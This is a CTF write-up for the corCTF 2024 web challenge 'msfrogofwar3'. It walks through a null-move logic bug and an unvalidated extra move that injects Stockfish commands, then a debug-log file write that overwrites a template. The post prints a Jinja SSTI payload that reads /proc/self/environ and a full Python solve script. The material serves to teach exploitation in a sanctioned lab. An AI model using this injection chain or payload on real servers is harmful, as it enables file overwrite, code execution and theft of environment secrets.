---
title: "msfrogofwar3 - corCTF 2024"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "chess", "stockfish", "websocket", "msfrogofwar3", "corctf", "corctf-2024", "2024", "ctf-writeup"]
summary: "My teammate Quasar carried corCTF this year, full clearing the Crypto category before I even finished moving back home from college."
source:
  name: "CTFtime writeup #39391"
  url: "https://ctftime.org/writeup/39391"
original_source: "https://stuxf.dev/blog/msfrogofwar3/"
ctf:
  name: "corCTF 2024"
  year: 2024
  challenge: "msfrogofwar3"
---

## Metadata

- **CTF:** corCTF 2024
- **Task:** msfrogofwar3
- **Author team:** .;,;.
- **CTFtime tags:** ssti, chess, stockfish
- **CTFtime:** <https://ctftime.org/writeup/39391>
- **Original writeup:** <https://stuxf.dev/blog/msfrogofwar3/>

---
# NOTE: original writeup is at [stuxf.dev/blog/msfrogofwar3/](https://stuxf.dev/blog/msfrogofwar3/), some images have been removed here because I'm lazy

## Intro

My teammate [Quasar](<https://github.com/quasar0147>) carried corCTF this year, full clearing the Crypto category before I even finished moving back home from college. As such, msfrogofwar3 was one of the only challenges I helped solve during this CTF. It ended up being important, as we were in a three-way tie a couple hours before the CTF ended, and solving this challenge brought us up to first place. All in all, this was a really cool challenge and was really satisfying to finally solve.

### Challenge

\- Authors: strellic, quintec  
\- Solves: 4  
## Analysis

### First Glance

After opening up the challenge, which is run through an instancer, we're met with a very familiar page. It looks identical to the msfrogofwar2 challenge from last year's corCTF 2023! Inside the tar.gz archive, we're also presented with several files. The bulk of the code is present inside `[app.py](http://app.py)`.

### Diff

Because a lot of the code is shared, we can diff these files with the challenge files from [msfrogofwar2](<https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/misc/msfrogofwar2/chall>) to get a better idea of what code is going to be vulnerable.   
From the diff file, the two biggest observations I made were:

1\. We now use the `chess` and `stockfish` python libraries, instead of the previously vulnerable `chesslib` and `movegen` in msfrogofwar2.  
\- This means that the legal moves are now determined by the `chess` library.  
\- We interact with Stockfish via the `stockfish` library, instead of directly.  
2\. Something has been done to the resulting win/loss/draw code, which is suspicious, as this shouldn't require too much modification.

### Ideas

The goal seems to be to beat Stockfish in 15 moves, five fewer than last year's 20. It's easy to see that we won't be able to devise a stronger engine to do this.

However, because I am a magical schizo, I have a couple of ideas.

The first one is quite intuitive. It's hard to lose in fifteen moves unless you can throw for the other side intentionally. So, the hope is that you can **play for stockfish**.

## Solve Path

### Playing as Black  
Based on schizo intuition 1, and the fact that move checking is pretty much done via the `python-chess` package. I discovered the existence of what's called a "null move" while reading through the [library code](<https://github.com/niklasf/python-chess/blob/32253d6cfdbc1939f78f03892fa848412cf4b4fa/chess/__init__.py#L2328-L2329>).

```python  
def push(self: BoardT, move: Move) -> None:  
"""  
Updates the position with the given *move* and puts it onto the  
move stack.

>>> import chess  
>>> board = chess.Board()  
>>> Nf3 = chess.Move.from_uci("g1f3")  
>>> board.push(Nf3) # Make the move  
>>> board.pop() # Unmake the last move  
Move.from_uci('g1f3')

Null moves just increment the move counters, switch turns and forfeit  
en passant capturing.

.. warning::  
Moves are not checked for legality. It is the caller's  
responsibility to ensure that the move is at least pseudo-legal or  
a null move.  
"""  
```

Without reading the entire code from the push function, the comments tell us that if we're somehow able to play a null move, then we'd be able to switch who we're playing for. So I send idea 2 to chat ... and am immediately shot down by Quasar, as it's not actually a legal move.

Unfortunately, the move code looks like this.

```python  
if outcome is None:  
try:  
move = chess.Move.from_uci(uci)  
if move:  
if move not in self.board.legal_moves:  
self.player_turn = True  
self.emit('state', self.get_player_state())  
self.emit("chat", {"name": "System", "msg": "Illegal move"})  
return  
self.board.push_uci(uci)  
```

There's quite a subtle bug here that Quasar missed initially. While the null move _is_ illegal, the actual call to `push_uci` is done **regardless of whether the move is illegal**. So when we send a null move, while it doesn't change player turn, the move gets pushed regardless and now we're able to play as black. To test this theory, we can try sending a null move via the websocket javascript console.

```javascript  
socket.emit('move', '0000')  
```

Sure enough, we've now swapped which side Stockfish is playing for, and we now play for Stockfish. Stockfish plays for us!

It's now trivial to lose the game. We can simply paste the following two lines of javascript after our null move and Stockfish plays.

```javascript  
socket.emit('move', 'f7f6')  
socket.emit('move', 'g7g5')  
```

And now white wins! We're greeted with a flag: 

```plaintext  
corctf{this_is_a_fake_flag}  
```

Hold up! Isn't this the same flag in the file?? As it turns out, we're not quite done yet. After a bit of pain and headbashing where we thought they had left the test flag in the remote service, we realized the real flag is hidden in the dockerfile as an environment variable.

Inside the `[start-docker.sh](http://start-docker.sh)` file, we find:

```bash  
#!/bin/sh  
docker build . -t msfrogofwar3  
docker run --rm -it -p 8080:8080 -e FLAG=corctf{real_flag} --name msfrogofwar3 msfrogofwar3  
```

Well now what! We've won the game, but we still need RCE. It's not immediately clear why winning the game helps us with RCE.

However, note this code snippet, from `[app.py](http://app.py)`:

```python  
def play_move(self, uci):  
if not self.player_turn:  
return  
if self.board.fullmove_number >= TURN_LIMIT:  
return  
  
self.player_turn = False

outcome = self.board.outcome()  
if outcome is None:  
try:  
move = chess.Move.from_uci(uci)  
if move:  
if move not in self.board.legal_moves:  
self.player_turn = True  
self.emit('state', self.get_player_state())  
self.emit("chat", {"name": "System", "msg": "Illegal move"})  
return  
self.board.push_uci(uci)  
except:  
self.player_turn = True  
self.emit('state', self.get_player_state())  
self.emit("chat", {"name": "System", "msg": "Invalid move format"})  
return  
elif outcome.winner != chess.WHITE:  
self.emit("chat", {"name": "?", "msg": "you lost, bozo"})  
return

self.moves.append(uci)  
```

Once again, there's another subtle logic bug. This time, if WHITE is the winner of the game, we get to add an extra move, as the case where WHITE is the winner is not handled properly, allowing us to skip straight to `self.moves.append(uci)`, and get an extra move in.

What's more interesting is that this one extra move also isn't authenticated. We skip all validation logic, including:

1\. Checking if the move is in UCI format  
2\. Verifying if the move is legal  
3\. Actually pushing the move onto the board  
  
This means we get arbitrary input to Stockfish. We can try to use this to obtain RCE! ?

### Arbitrary Stockfish Input

In summary of above, we can now get arbitrary input to stockfish. Code to do so looks like this.

```javascript  
// Null move to switch sides  
socket.emit('move', '0000')  
// Moves to win the game through scholars mate  
socket.emit('move', 'f7f6')  
socket.emit('move', 'g7g5')  
// Unauthenticated move goes here  
socket.emit('move', 'a7a6\n...unauthenticatedstuffhere')  
```

After a bit of poking around the Stockfish source and docs, my teammate [Flocto](<https://flocto.github.io>) found out about [Stockfish Commands]([https://github.com/official-stockfish/Stockfish/wiki/UCI-&-Commands](https://github.com/official-stockfish/Stockfish/wiki/UCI-&-Commands)).

We weren't able to find any straight up code execution here, but we did find something else. One of the stockfish commands, `setoption`, allows us to change the parameters of the Stockfish Engine. And one of these parameters we can set is the `Debug Log File`, which we can use to "Write all communication to and from the engine into a text file".

With this in mind, we have arbitrary file write, right? Not quite. As it turns out, stockfish actually appends every message in it's log file with either `>>` or `<<`, which can be found in the [Stockfish code](<https://github.com/official-stockfish/Stockfish/blob/b55217fd02d8e5bc0754e5f27bc84df7b01479a6/src/misc.cpp#L58>).

```  
int uflow() override { return log(buf->sbumpc(), ">> "); }  
```

### Dirty Arbitrary File Write

See, we got stuck on this for a very long time. It's very hard to create a valid file with the constraints that it must always start with `>>`. What we have is not quite arbitrary file write, but is instead referred to as dirty arbitrary file write.

Unfortunately, it's very hard to actually write a python or bash file that starts with `>>`. In fact, I'm pretty sure it's impossible, as they'll be malformed. We also can't directly write a binary, because that'll also not work properly.

After a couple hours, including me leaving my team alone to play some Minecraft, I came back, looked at the challenge again for a bit, and realized that we can overwrite `index.html`, as html isn't so strictly parsed.

### SSTI

We now have Server Side Template Injection (SSTI), which pretty much gives us RCE! ?

There are however a couple things to note. If we overwrite `index.html` after visiting it, we'll run into issues, as it'll be loaded into memory and our new template won't execute. So now we need to write a script that interacts directly with the socket, and **never loads `index.html`**. 

Our flag is also stored in an environment variable, and my teammate Ani pulled out a nice payload for SSTI.

```python  
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/proc/self/environ").read() }}  
```

Now all that's left is to put it together.

## Solve

Solve script, credit goes to [Jayden](<https://github.com/jaydns>) for actually implementing and writing the solve script for this challenge.

```python  
import socketio  
import time

sio = socketio.Client()

moves = [  
'0000',  
'f7f6',  
'g7g5',  
'a7a6\nsetoption name Debug Log File value templates/index.html\n{{ request.__class__._load_form_data.__globals__.__builtins__.open("/proc/self/environ").read() }}'  
]

@sio.event  
def connect():  
print('connected')  
send_moves()

def send_moves():  
for move in moves:  
print(f"sending {move}")  
sio.emit('move', move)  
time.sleep(20)  
  
sio.disconnect()

if __name__ == '__main__':  
sio.connect('<https://msfrogofwar3.be.ax/'>)  
sio.wait()  
```

And here lies the flag.

```plaintext  
corctf{"Whatever you do, don''t reveal all your techniques in a CTF challenge, you fool, you moron." - Sun Tzu, The Art of War}  
```

### Concluding Thoughts

In hindsight, this challenge definitely could've been a lot easier if I had paid more attention to the diffs. Our first big time loss was not realizing that beating Stockfish was only the first part of the challenge, which we would've seen if we had just realized that the Dockerfile was different and had a different (not fake) flag inside of it. The second part we were stuck on but should've been quite easy was the dirty arbitrary file write. While working on the challenge, I didn't even realize the template portion of the code was changed, and evidently none of my teammates did too. If we had noticed that templates were added, I think SSTI would've came up to mind a lot quicker than it did, and we would've had much less trouble solving the challenge.

Regardless of all the shenanigans we wasted our time on, we did ultimately end up solving this challenge and it was super fun to do. Thanks to `strellic` and `quintec` for once again writing an awesome chess challenge, definitely looking forward to another one next year if corCTF is hosted again. Also huge thanks to my teammates, there was a lot of collaboration that went into solving this challenge. ❤️
